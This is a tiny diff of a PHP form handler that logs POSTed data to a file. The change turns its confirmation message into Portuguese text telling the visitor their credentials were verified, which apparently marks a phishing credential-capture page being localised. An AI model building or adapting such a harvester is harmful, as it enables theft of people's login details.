@@ -8,6 +8,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     file_put_contents($logFile, $logEntry, FILE_APPEND);
 
-    echo "Thank you! Your information has been verified.";
+    echo "Obrigada, suas credenciais foram verificadas.";
 }
 ?>
